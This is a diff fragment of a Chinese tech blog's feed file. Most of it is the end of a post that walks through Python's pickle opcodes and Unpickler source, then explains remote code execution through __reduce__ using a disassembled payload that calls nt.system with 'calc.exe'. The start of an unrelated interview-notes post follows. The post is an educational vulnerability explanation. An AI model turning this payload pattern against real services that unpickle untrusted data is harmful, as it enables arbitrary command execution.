+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python"> &lt;span class="k">def&lt;/span> &lt;span class="nf">load_appends&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;span class="n">items&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">pop_mark&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;span class="n">list_obj&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">stack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;span class="k">try&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="n">extend&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">list_obj&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">extend&lt;/span>
+&lt;span class="k">except&lt;/span> &lt;span class="ne">AttributeError&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="k">pass&lt;/span>
+&lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="n">extend&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">items&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="k">return&lt;/span>
+&lt;span class="c1"># Even if the PEP 307 requires extend() and append() methods,&lt;/span>
+&lt;span class="c1"># fall back on append() if the object has no extend() method&lt;/span>
+&lt;span class="c1"># for backward compatibility.&lt;/span>
+&lt;span class="n">append&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">list_obj&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>
+&lt;span class="k">for&lt;/span> &lt;span class="n">item&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">items&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="n">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">item&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="n">dispatch&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">APPENDS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">load_appends&lt;/span>
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;code>appends&lt;/code>将&lt;code>memo&lt;/code>中保存的前一个栈弹出，然后把当前栈上的所有值压到前一个栈顶的空列表中。如此就成功得到了我们输入的列表。&lt;/p>
+&lt;h4 id="stop">STOP&lt;/h4>
+&lt;p>最后的 &lt;code>STOP&lt;/code> 指令没有操作数。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python"> &lt;span class="k">def&lt;/span> &lt;span class="nf">load_stop&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;span class="n">value&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">stack&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">pop&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;span class="k">raise&lt;/span> &lt;span class="n">_Stop&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">value&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="n">dispatch&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">STOP&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">load_stop&lt;/span>
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>效果也很简单，将栈顶的对象弹出，这个对象就是最终被 pickle 恢复完成的对象了。&lt;/p>
+&lt;h3 id="rce利用">RCE利用&lt;/h3>
+&lt;p>pickle 的反序列化任意代码执行漏洞来自 pickle 序列化/反序列化实例的一种约定，即&lt;code>__reduce__&lt;/code>魔术方法。&lt;/p>
+&lt;p>对自定义类的实例，pickle 没法保证一定能还原出原对象。比如类里包含一个打开了的文件描述符，fd是没法保存的，程序一重启先前保存的 fd 就失效了，如果要恢复唯一的办法就是重新打开一次，或重新构造一次这个实例。&lt;/p>
+&lt;p>提供 &lt;code>__reduce__&lt;/code> 魔术方法以允许 pickle 将当前对象转为一系列构造和恢复实例所需的参数：类型、构造参数、状态参数等。&lt;/p>
+&lt;p>一般对 &lt;code>__reduce__&lt;/code> 的利用就是构造参数的部分，将构造方法指定为 &lt;code>os.system&lt;/code> 即可执行任意命令。&lt;/p>
+&lt;p>同样这里提供一个例子，在反序列化时会弹出计算器。&lt;/p>
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20220624175833655.png"
+width="1573"
+height="581"
+srcset="https://nnnewb.github.io/blog/blog/p/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20220624175833655_hub937d7691963b68ff3337ee6eb814a2f_51193_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20220624175833655_hub937d7691963b68ff3337ee6eb814a2f_51193_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220624175833655"
+class="gallery-image"
+data-flex-grow="270"
+data-flex-basis="649px"
+>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext"> 0: \x80 PROTO 3
+2: c GLOBAL &amp;#39;nt system&amp;#39;
+13: q BINPUT 0
+15: X BINUNICODE &amp;#39;calc.exe&amp;#39;
+28: q BINPUT 1
+30: \x85 TUPLE1
+31: q BINPUT 2
+33: R REDUCE
+34: q BINPUT 3
+36: . STOP
+highest protocol among opcodes = 2
+None
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>接着我们具体分析我们没见过的指令。&lt;/p>
+&lt;h4 id="global">GLOBAL&lt;/h4>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python"> &lt;span class="k">def&lt;/span> &lt;span class="nf">load_global&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;span class="n">module&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">readline&lt;/span>&lt;span class="p">()[:&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;utf-8&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="n">name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">readline&lt;/span>&lt;span class="p">()[:&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;utf-8&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="n">klass&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">find_class&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">module&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">klass&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="n">dispatch&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">GLOBAL&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">load_global&lt;/span>
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>global 指令查找指定的模块，注意&lt;code>find_class&lt;/code>并不&lt;strong>只&lt;/strong>找类，函数也能被找出来。这一条指令执行后，栈顶保存的就是 &lt;code>nt.system&lt;/code> 了。&lt;/p>
+&lt;h4 id="binunicode">BINUNICODE&lt;/h4>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext"> 13: q BINPUT 0
+15: X BINUNICODE &amp;#39;calc.exe&amp;#39;
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>在&lt;code>BINPUT&lt;/code>把&lt;code>nt.system&lt;/code>所在的栈记到 &lt;code>memo[0]&lt;/code> 后，是一个 &lt;code>BINUNICODE&lt;/code>。&lt;/p>
+&lt;p>和&lt;code>BININT&lt;/code>差不多，压栈一个unicode字符串。&lt;/p>
+&lt;h4 id="tuple1">TUPLE1&lt;/h4>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext"> 28: q BINPUT 1
+30: \x85 TUPLE1
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>再次更换栈，&lt;code>TUPLE1&lt;/code>从栈顶构造一个元组。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python"> &lt;span class="k">def&lt;/span> &lt;span class="nf">load_tuple1&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">stack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">stack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">],)&lt;/span>
+&lt;span class="n">dispatch&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">TUPLE1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">load_tuple1&lt;/span>
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>这一步将刚压栈的&lt;code>calc.exe&lt;/code>构造成了&lt;code>('calc.exe',)&lt;/code>。&lt;/p>
+&lt;h4 id="reduce">REDUCE&lt;/h4>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext"> 31: q BINPUT 2
+33: R REDUCE
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>将刚构造好的元组记录到&lt;code>memo[2]&lt;/code>后，开始 &lt;code>REDUCE&lt;/code> 指令。正是这一步触发了任意代码执行。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="n">REDUCE&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;R&amp;#39;&lt;/span> &lt;span class="c1"># apply callable to argtuple, both on stack&lt;/span>
+&lt;span class="k">def&lt;/span> &lt;span class="nf">load_reduce&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;span class="n">stack&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">stack&lt;/span>
+&lt;span class="n">args&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">stack&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">pop&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;span class="n">func&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">stack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;span class="n">stack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">args&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="n">dispatch&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">REDUCE&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">load_reduce&lt;/span>
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>这段代码中&lt;code>args&lt;/code>是我们刚构造好的&lt;code>('calc.exe',)&lt;/code>，&lt;code>func&lt;/code>是&lt;code>nt.system&lt;/code>，这个函数的调用结果成为最后留在栈里的对象。&lt;/p>
+&lt;p>而我们的恶意代码（弹计算器）也执行了。&lt;/p>
+&lt;h2 id="总结">总结&lt;/h2></description></item><item><title>2022年5月27日 面试记录</title><link>https://nnnewb.github.io/blog/p/2022-05-27-interview-note/</link><pubDate>Fri, 27 May 2022 18:33:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/2022-05-27-interview-note/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
 &lt;p>面试完，结果只能说我对自己也不算很满意，顺带反思了一下是不是表现得太着急了。&lt;/p>
 &lt;p>原本以为一个小时足矣，结果面到快12点，才结束完面试，还没出门就碰到泼水一样的暴雨。花了一个多钟头到家，已经是下午1点十几分了。原本打算去公司继续上下午的班，但累到没有一点心情，于是把上午的假延长到下午。&lt;/p>
 &lt;p>typora 建好文件后就着住房改造家的视频吃了午饭，再看会儿 boss 上的的 jd ，还是劝自己把面试的复盘写完，迟早都是要写的。&lt;/p>
